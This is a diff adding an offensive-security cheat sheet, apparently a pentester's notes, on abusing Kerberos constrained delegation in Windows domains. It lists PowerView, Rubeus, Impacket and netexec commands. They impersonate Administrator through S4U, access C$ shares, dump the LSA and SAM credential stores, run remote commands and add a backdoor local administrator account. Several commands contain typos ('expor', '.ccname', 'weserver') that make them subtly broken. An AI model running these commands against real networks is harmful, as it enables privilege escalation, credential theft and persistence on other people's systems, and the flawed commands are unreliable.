@@ -1,0 +1,60 @@
+#Kerberoast - Constrained delegation 
+
+#Method 1- Windows - powershell- powerview 
+
+>Get-NetComputer -TrustedToAuth 
+>Get-NetUser -TrustedToAuth
+
+Look for the property "msds-allowedtodelegateto", "name"
+
+Convert the password into the NTLM or encrypted with the RC4 
+>.\Rubeus.exe hash /password:password
+
+Now let's use the password
+>.\Rubeus.exe s4u /user:compromised_user /rc4:HASH /domain:DOMAINNAME  /msdsspn:cifs/webserver.DOMAIN.NAME /impersonateuser:Administrator /ptt /nowrap
+
+We will get the TGT with S4U2SELF of Domain Administrator for Service(SPN): cifs/webserver.DOMAIN.NAME 
+
+Access the files as the TGT is been exported 
+> dir \\webserver.DOMAINNAME\C$ 
+
+
+
+#Method 2: Kali 
+
+Copy the TGT we got from the windows/rubeus
+#echo "TGT" | base64 -d > Admin-weserver-cifs.kirbi 
+#impacket-ticketConverter Admin-weserver-cifs.kirbi Admin-weserver-cifs.ccache  
+#expor KRB5CCNAME=Admin-weserver-cifs.ccname
+
+Access the files of loca system of the user 
+#impacket-smbclient -k webserver.domainname 
+
+Running the system commands 
+#netexec smb webserver.domainname --use-kcache --lsa 
+#netexec smb webserver.domainname --use-kcache --sam
+#netexec smb webserver.domainname --use-kcache -x 'whoami' 
+
+#impacket-getST -spn cifs/weserver.domainname domainserver/webserver:'password' -dc-ip DCIP -impersonate Administrator 
+#export KRB5CCNAME=Administrator@cifs_weserver.domainname@DOMAINNAME.ccache
+
+
+
+Enter the windows system again ---  (Let's suppose ifwe want to access the PSremoting or other alternative services) 
+
+
+>.\Rubeus.exe s4u /user:compromised_user /rc4:HASH /domain:DOMAINNAME  /msdsspn:cifs/webserver.DOMAIN.NAME /impersonateuser:Administrator /ptt /nowrap
+
+
+>$sess= New-PSSession -ComputerName webserver.domainname 
+>Enter-PSSession -Session $sess 
+>whoami 
+>hostname
+>net user pentest pentest@123 /add 
+>net user  
+>net localgroup Administrator pentest /add 
+>net localgroup Administrator
+
+
+#Kerberos Resource based delegation 
+
